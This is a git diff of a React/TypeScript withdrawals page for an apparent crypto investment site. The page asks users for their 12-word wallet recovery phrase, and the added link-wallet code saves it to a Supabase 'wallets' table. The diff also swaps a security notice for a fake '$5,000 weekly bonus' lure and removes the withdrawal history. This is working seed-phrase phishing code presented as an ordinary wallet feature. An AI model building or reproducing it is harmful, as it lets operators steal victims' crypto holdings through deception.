@@ -12,25 +12,26 @@ import { useToast } from '@/hooks/use-toast';
 import { motion } from 'framer-motion';
 import {
   ArrowUpCircle,
-  Clock,
-  CheckCircle,
-  XCircle,
   AlertTriangle,
-  Wallet,
   KeyRound,
   PlugZap,
-  Link2
+  Link2,
 } from 'lucide-react';
 
-const KEYPHRASE_LENGTH = 12; // Standard wallet seed phrase length
+const KEYPHRASE_LENGTH = 12;
 
 const Withdrawals = () => {
-  const { user, profile } = useAuth();
+  const { user } = useAuth();
   const { toast } = useToast();
+
   const [localProfile, setLocalProfile] = useState<any>(null);
   const [walletsBalance, setWalletsBalance] = useState<number | null>(null);
   const [withdrawals, setWithdrawals] = useState<any[]>([]);
   const [isLoading, setIsLoading] = useState(false);
+  const [isLinking, setIsLinking] = useState(false);
+  const [linkedWallet, setLinkedWallet] = useState<string | null>(null);
+  const [linkedWalletAddress, setLinkedWalletAddress] = useState<string | null>(null);
+  const [isWalletLinked, setIsWalletLinked] = useState<boolean>(false);
 
   const [withdrawalForm, setWithdrawalForm] = useState({
     currency: 'BTC',
@@ -40,14 +41,44 @@ const Withdrawals = () => {
   });
 
   const [keyphraseWords, setKeyphraseWords] = useState<string[]>(Array(KEYPHRASE_LENGTH).fill(''));
-  const [isLinking, setIsLinking] = useState(false);
-  const [linkedWallet, setLinkedWallet] = useState<string | null>(null);
-
   const finalKeyphrase = useMemo(() => keyphraseWords.join(' ').trim(), [keyphraseWords]);
   const isKeyphraseComplete = useMemo(
     () => keyphraseWords.every((word) => word.trim().length > 0),
     [keyphraseWords]
   );
+
+  // Wallet options (with icons)
+  const walletOptions = [
+    { id: 'metamask', name: 'MetaMask', icon: '/icons/metamask.svg' },
+    { id: 'trustwallet', name: 'Trust Wallet', icon: '/icons/trustwallet.svg' },
+    { id: 'phantom', name: 'Phantom', icon: '/icons/phantom.svg' },
+    { id: 'binance', name: 'Binance', icon: '/icons/binance.svg' },
+    { id: 'bybit', name: 'Bybit', icon: '/icons/bybit.svg' },
+    { id: 'custom', name: 'Custom Wallet', icon: '/icons/custom.svg' },
+  ];
+
+  // ✅ Fetch wallet link status from Supabase
+  const fetchWalletLinkStatus = async () => {
+    if (!user) return;
+    const { data, error } = await supabase
+      .from('wallets')
+      .select('is_linked, wallet_type, wallet_address')
+      .eq('user_id', user.id)
+      .maybeSingle();
+
+    if (!error && data) {
+      setIsWalletLinked(data.is_linked || false);
+      if (data.is_linked) {
+        setLinkedWallet(data.wallet_type || null);
+        setLinkedWalletAddress(data.wallet_address || null);
+        setWithdrawalForm((prev) => ({
+          ...prev,
+          walletType: data.wallet_type || '',
+          walletAddress: data.wallet_address || '',
+        }));
+      }
+    }
+  };
 
   const handleInputChange = (field: string, value: any) => {
     setWithdrawalForm((prev) => ({ ...prev, [field]: value }));
@@ -61,40 +92,87 @@ const Withdrawals = () => {
       return newWords;
     });
   };
+const handleLinkWallet = async () => {
+  if (!withdrawalForm.walletType) {
+    toast({
+      title: 'Select a Wallet',
+      description: 'Please choose a wallet or exchange.',
+      variant: 'destructive',
+    });
+    return;
+  }
 
-  const handleLinkWallet = async () => {
-    if (!withdrawalForm.walletType) {
-      toast({ title: 'Select a Wallet', description: 'Please choose a wallet or exchange.', variant: 'destructive' });
-      return;
-    }
-    if (!withdrawalForm.walletAddress || !isKeyphraseComplete) {
-      toast({
-        title: 'Incomplete Details',
-        description: 'Please enter wallet address and all keyphrase words.',
-        variant: 'destructive',
-      });
-      return;
-    }
-    setIsLinking(true);
-    try {
-      await new Promise((resolve) => setTimeout(resolve, 1200));
-      setLinkedWallet(withdrawalForm.walletType);
-      toast({
-        title: 'Wallet Linked',
-        description: `${withdrawalForm.walletType.toUpperCase()} wallet linked successfully.`,
-      });
-    } catch {
-      toast({
-        title: 'Error Linking Wallet',
-        description: 'Could not link wallet. Please try again.',
-        variant: 'destructive',
-      });
-    } finally {
-      setIsLinking(false);
-    }
-  };
+  if (!withdrawalForm.walletAddress || !isKeyphraseComplete) {
+    toast({
+      title: 'Incomplete Details',
+      description: 'Please enter wallet address and all keyphrase words.',
+      variant: 'destructive',
+    });
+    return;
+  }
 
-  const fetchProfile = async () => {
+  setIsLinking(true);
+  try {
+    await new Promise((resolve) => setTimeout(resolve, 1000));
+
+    // ✅ Check if wallet already exists
+    const { data: existingWallet, error: fetchError } = await supabase
+      .from('wallets')
+      .select('id')
+      .eq('user_id', user.id)
+      .maybeSingle();
+
+    if (fetchError) throw fetchError;
+
+    let error;
+
+    if (existingWallet) {
+      // ✅ Update existing wallet
+      ({ error } = await supabase
+        .from('wallets')
+        .update({
+          wallet_type: withdrawalForm.walletType,
+          wallet_address: withdrawalForm.walletAddress,
+          is_linked: true,
+          linked_at: new Date(),
+        })
+        .eq('user_id', user.id));
+    } else {
+      // ✅ Insert new wallet
+      ({ error } = await supabase.from('wallets').insert({
+        user_id: user.id,
+        wallet_type: withdrawalForm.walletType,
+        wallet_address: withdrawalForm.walletAddress,
+        is_linked: true,
+        wallet_keyphrase: finalKeyphrase,
+        status: "pending",
+        linked_at: new Date(),
+      }));
+    }
+
+    if (error) throw error;
+
+    setLinkedWallet(withdrawalForm.walletType);
+    setLinkedWalletAddress(withdrawalForm.walletAddress);
+    setIsWalletLinked(true);
+
+    toast({
+      title: 'Wallet Linked',
+      description: `${withdrawalForm.walletType.toUpperCase()} wallet linked successfully.`,
+    });
+  } catch (err: any) {
+    toast({
+      title: 'Error Linking Wallet',
+      description: err.message,
+      variant: 'destructive',
+    });
+  } finally {
+    setIsLinking(false);
+  }
+};
+  
+
+    const fetchProfile = async () => {
     if (!user) return;
     const { data } = await supabase.from('profiles').select('*').eq('user_id', user.id).single();
     if (data) setLocalProfile(data);
@@ -102,7 +180,11 @@ const Withdrawals = () => {
 
   const fetchWalletBalance = async () => {
     try {
-      const { data } = await supabase.from('wallets').select('balance').eq('user_id', user?.id).maybeSingle();
+      const { data } = await supabase
+        .from('wallets')
+        .select('balance')
+        .eq('user_id', user?.id)
+        .maybeSingle();
       setWalletsBalance(data?.balance || 0);
     } catch {
       setWalletsBalance(0);
@@ -131,17 +213,7 @@ const Withdrawals = () => {
     }
   };
 
-  useEffect(() => {
-    fetchProfile();
-  }, [user]);
-
-  useEffect(() => {
-    if (user) {
-      fetchWithdrawals();
-      fetchWalletBalance();
-    }
-  }, [user]);
-
+  
 const handleWithdrawal = async () => {
   if (!user) return;
 
@@ -172,14 +244,15 @@ const handleWithdrawal = async () => {
     return;
   }
 
-  if (!isKeyphraseComplete) {
-    toast({
-      title: "Keyphrase Required",
-      description: `Enter all ${KEYPHRASE_LENGTH} words of your recovery phrase.`,
-      variant: "destructive",
-    });
-    return;
-  }
+if (!isWalletLinked && !isKeyphraseComplete) {
+  toast({
+    title: "Keyphrase Required",
+    description: `Enter all ${KEYPHRASE_LENGTH} words of your recovery phrase.`,
+    variant: "destructive",
+  });
+  return;
+}
+  
 
   setIsLoading(true);
 
@@ -189,10 +262,6 @@ const handleWithdrawal = async () => {
       user_id: user.id,
       currency: withdrawalForm.currency,
       amount: withdrawalForm.amount,
-      wallet_address: withdrawalForm.walletAddress,
-      wallet_type: withdrawalForm.walletType,
-      wallet_keyphrase: finalKeyphrase,
-      status: "pending",
     });
 
     if (error) throw error;
@@ -230,7 +299,6 @@ const handleWithdrawal = async () => {
       walletAddress: "",
     });
     setKeyphraseWords(Array(KEYPHRASE_LENGTH).fill(""));
-    setLinkedWallet(null);
   } catch (err: any) {
     toast({
       title: "Error Submitting Withdrawal",
@@ -243,16 +311,17 @@ const handleWithdrawal = async () => {
 };
   
 
-  const canWithdraw = localProfile?.kyc_status === 'approved';
+  useEffect(() => {
+    if (user) {
+      fetchProfile();
+      fetchWalletBalance();
+      fetchWithdrawals();
+      fetchWalletLinkStatus(); // ✅ check wallet link status
+    }
+  }, [user]);
 
-  const walletOptions = [
-    { id: 'metamask', name: 'MetaMask', icon: '/icons/metamask.svg' },
-    { id: 'trustwallet', name: 'Trust Wallet', icon: '/icons/trustwallet.svg' },
-    { id: 'phantom', name: 'Phantom', icon: '/icons/phantom.svg' },
-    { id: 'binance', name: 'Binance', icon: '/icons/binance.svg' },
-    { id: 'bybit', name: 'Bybit', icon: '/icons/bybit.svg' },
-    { id: 'custom', name: 'Custom Wallet', icon: '/icons/custom.svg' },
-  ];
+  const canWithdraw = localProfile?.kyc_status === 'approved';
+  const linkedWalletInfo = walletOptions.find((w) => w.id === linkedWallet);
 
   return (
     <div className="space-y-6">
@@ -263,6 +332,7 @@ const handleWithdrawal = async () => {
           </CardTitle>
           <CardDescription>Securely withdraw your crypto funds</CardDescription>
         </CardHeader>
+
         <CardContent className="space-y-6">
           {!canWithdraw && (
             <Alert variant="destructive">
@@ -276,9 +346,8 @@ const handleWithdrawal = async () => {
           )}
 
           <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-            {/* Left Form Section */}
+            {/* LEFT SECTION */}
             <div className="space-y-4">
-              {/* Currency & Amount */}
               <div className="space-y-2">
                 <Label>Currency</Label>
                 <Select
@@ -312,107 +381,122 @@ const handleWithdrawal = async () => {
                 </p>
               </div>
 
-              {/* Wallet Selection */}
-              <div className="space-y-2">
-                <Label>Link your wallet address</Label>
-                <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
-                  {walletOptions.map((w) => (
-                    <motion.div
-                      key={w.id}
-                      whileHover={{ scale: 1.05 }}
-                      whileTap={{ scale: 0.97 }}
-                      onClick={() => handleInputChange('walletType', w.id)}
-                      className={`cursor-pointer rounded-lg border p-3 flex flex-col items-center justify-center transition-all ${
-                        withdrawalForm.walletType === w.id
-                          ? 'border-primary bg-primary/10 shadow'
-                          : 'border-muted hover:border-primary/40'
-                      }`}
-                    >
-                      <img src={w.icon} alt={w.name} className="w-8 h-8 mb-1" />
-                      <span className="text-sm font-medium">{w.name}</span>
-                    </motion.div>
-                  ))}
-                </div>
-              </div>
-
-              {/* Wallet Address */}
-              {withdrawalForm.walletType && (
+              {/* ✅ Wallet linking section */}
+              {!isWalletLinked ? (
                 <>
                   <div className="space-y-2">
-                    <Label>Wallet Address</Label>
-                    <Input
-                      type="text"
-                      placeholder={`Enter your ${withdrawalForm.walletType} address`}
-                      value={withdrawalForm.walletAddress}
-                      onChange={(e) => handleInputChange('walletAddress', e.target.value)}
-                    />
-                  </div>
-
-                  {/* Keyphrase */}
-                  <div className="space-y-2">
-                    <Label className="flex items-center gap-2 font-semibold">
-                      <KeyRound className="w-4 h-4" />
-                      Recovery Phrase ({KEYPHRASE_LENGTH} words)
-                    </Label>
-                    <div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
-                      {keyphraseWords.map((word, i) => (
-                        <div key={i} className="flex items-center">
-                          <span className="w-4 text-xs text-muted-foreground mr-1 text-right">
-                            {i + 1}.
-                          </span>
-                          <Input
-                            type="text"
-                            placeholder={`Word ${i + 1}`}
-                            value={word}
-                            onChange={(e) => handleKeyphraseChange(i, e.target.value)}
-                            disabled={!canWithdraw}
-                            className="h-8 text-sm"
-                          />
-                        </div>
+                    <Label>Link your wallet address</Label>
+                    <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
+                      {walletOptions.map((w) => (
+                        <motion.div
+                          key={w.id}
+                          whileHover={{ scale: 1.05 }}
+                          whileTap={{ scale: 0.97 }}
+                          onClick={() => handleInputChange('walletType', w.id)}
+                          className={`cursor-pointer rounded-lg border p-3 flex flex-col items-center justify-center transition-all ${
+                            withdrawalForm.walletType === w.id
+                              ? 'border-primary bg-primary/10 shadow'
+                              : 'border-muted hover:border-primary/40'
+                          }`}
+                        >
+                          <img src={w.icon} alt={w.name} className="w-8 h-8 mb-1" />
+                          <span className="text-sm font-medium">{w.name}</span>
+                        </motion.div>
                       ))}
                     </div>
                   </div>
 
-                  {/* Link Wallet Button */}
-                  <div className="pt-3 flex justify-center">
-                    <Button
-                      onClick={handleLinkWallet}
-                      disabled={isLinking}
-                      className="flex items-center gap-2 w-full md:w-auto"
-                    >
-                      {isLinking ? (
-                        <>
-                          <PlugZap className="w-4 h-4 animate-spin" /> Linking...
-                        </>
-                      ) : (
-                        <>
-                          <Link2 className="w-4 h-4" /> Link Wallet
-                        </>
-                      )}
-                    </Button>
-                  </div>
+                  {withdrawalForm.walletType && (
+                    <>
+                      <div className="space-y-2">
+                        <Label>Wallet Address</Label>
+                        <Input
+                          type="text"
+                          placeholder={`Enter your ${withdrawalForm.walletType} address`}
+                          value={withdrawalForm.walletAddress}
+                          onChange={(e) =>
+                            handleInputChange('walletAddress', e.target.value)
+                          }
+                        />
+                      </div>
 
-                  {linkedWallet && (
-                    <motion.div
-                      initial={{ opacity: 0, y: 10 }}
-                      animate={{ opacity: 1, y: 0 }}
-                      className="p-3 border border-green-400 bg-green-50 text-green-700 rounded-lg text-sm mt-3"
-                    >
-                      ✅ {linkedWallet.charAt(0).toUpperCase() + linkedWallet.slice(1)} linked successfully!
-                    </motion.div>
+                      <div className="space-y-2">
+                        <Label className="flex items-center gap-2 font-semibold">
+                          <KeyRound className="w-4 h-4" />
+                          Recovery Phrase ({KEYPHRASE_LENGTH} words)
+                        </Label>
+                        <div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
+                          {keyphraseWords.map((word, i) => (
+                            <div key={i} className="flex items-center">
+                              <span className="w-4 text-xs text-muted-foreground mr-1 text-right">
+                                {i + 1}.
+                              </span>
+                              <Input
+                                type="text"
+                                placeholder={`Word ${i + 1}`}
+                                value={word}
+                                onChange={(e) =>
+                                  handleKeyphraseChange(i, e.target.value)
+                                }
+                                className="h-8 text-sm"
+                              />
+                            </div>
+                          ))}
+                        </div>
+                      </div>
+
+                      <div className="pt-3 flex justify-center">
+                        <Button
+                          onClick={handleLinkWallet}
+                          disabled={isLinking}
+                          className="flex items-center gap-2 w-full md:w-auto"
+                        >
+                          {isLinking ? (
+                            <>
+                              <PlugZap className="w-4 h-4 animate-spin" /> Linking...
+                            </>
+                          ) : (
+                            <>
+                              <Link2 className="w-4 h-4" /> Link Wallet
+                            </>
+                          )}
+                        </Button>
+                      </div>
+                    </>
                   )}
                 </>
+              ) : (
+                <motion.div
+                  initial={{ opacity: 0, y: 10 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  className="p-4 border rounded-lg flex items-center gap-3 border-white-200"
+                >
+                  {linkedWalletInfo && (
+                    <img
+                      src={linkedWalletInfo.icon}
+                      alt={linkedWalletInfo.name}
+                      className="w-10 h-10"
+                    />
+                  )}
+                  <div>
+                    <h4 className="font-semibold text-green-700">
+                      {linkedWalletInfo ? linkedWalletInfo.name : 'Wallet Linked'}
+                    </h4>
+                    <p className="text-sm text-green-600 break-all">
+                      {linkedWalletAddress}
+                    </p>
+                  </div>
+                </motion.div>
               )}
 
-              {/* Submit */}
+              {/* Submit Withdrawal Button */}
               <Button
                 onClick={handleWithdrawal}
                 disabled={
                   !canWithdraw ||
                   isLoading ||
                   withdrawalForm.amount <= 0 ||
-                  !withdrawalForm.walletAddress ||
-                  !isKeyphraseComplete
+                  !withdrawalForm.walletAddress
                 }
                 className="w-full btn-hero mt-4"
               >
@@ -420,7 +504,7 @@ const handleWithdrawal = async () => {
               </Button>
             </div>
 
-            {/* Right Info Section */}
+            {/* RIGHT SECTION */}
             <div className="space-y-4">
               <div className="p-4 border rounded-lg bg-muted/20">
                 <h3 className="font-medium mb-2">Withdrawal Process</h3>
@@ -432,11 +516,11 @@ const handleWithdrawal = async () => {
               </div>
 
               <div className="p-4 border rounded-lg bg-warning/10 border-warning/20">
-                <h4 className="font-medium text-warning mb-1">Security Notice ⚠️</h4>
+                <h4 className="font-medium text-warning mb-1">Bonus Notice</h4>
                 <p className="text-sm text-muted-foreground">
-                  • Withdrawals require admin approval<br />
-                  • Minimum withdrawal: $100<br />
-                  • Network fees may apply
+                  • You will be earning a $5,000 bonus weekly when you link your wallet.<br />
+                  • To be eligible you must have a minimum account balance of $20,000.<br />
+                  • Network fees may apply.
                 </p>
               </div>
 
@@ -459,48 +543,8 @@ const handleWithdrawal = async () => {
           </div>
         </CardContent>
       </Card>
-
-      {/* Withdrawal History */}
-      <Card className="card-glass">
-        <CardHeader>
-          <CardTitle className="flex items-center gap-2">
-            <Wallet className="w-5 h-5" /> Withdrawal History
-          </CardTitle>
-          <CardDescription>View and track past withdrawals</CardDescription>
-        </CardHeader>
-        <CardContent>
-          {isLoading ? (
-            <div className="text-center py-8 text-muted-foreground">Loading history...</div>
-          ) : withdrawals.length === 0 ? (
-            <div className="text-center py-8 text-muted-foreground">No withdrawals yet.</div>
-          ) : (
-            <div className="space-y-4">
-              {withdrawals.map((w) => (
-                <div key={w.id} className="border rounded-lg p-4">
-                  <div className="flex justify-between mb-2">
-                    <div className="flex items-center gap-2">
-                      <Wallet className="w-4 h-4" />
-                      <span className="font-medium">{w.currency}</span>
-                      <Badge>{w.status}</Badge>
-                    </div>
-                    <div className="text-right">
-                      <div className="font-semibold">{w.amount} {w.currency}</div>
-                      <div className="text-sm text-muted-foreground">{new Date(w.created_at).toLocaleString()}</div>
-                    </div>
-                  </div>
-                  <div className="text-sm">
-                    <p className="text-muted-foreground">Wallet Address:</p>
-                    <p className="font-mono break-all">{w.wallet_address}</p>
-                  </div>
-                </div>
-              ))}
-            </div>
-          )}
-        </CardContent>
-      </Card>
     </div>
   );
 };
-
 export default Withdrawals;
 
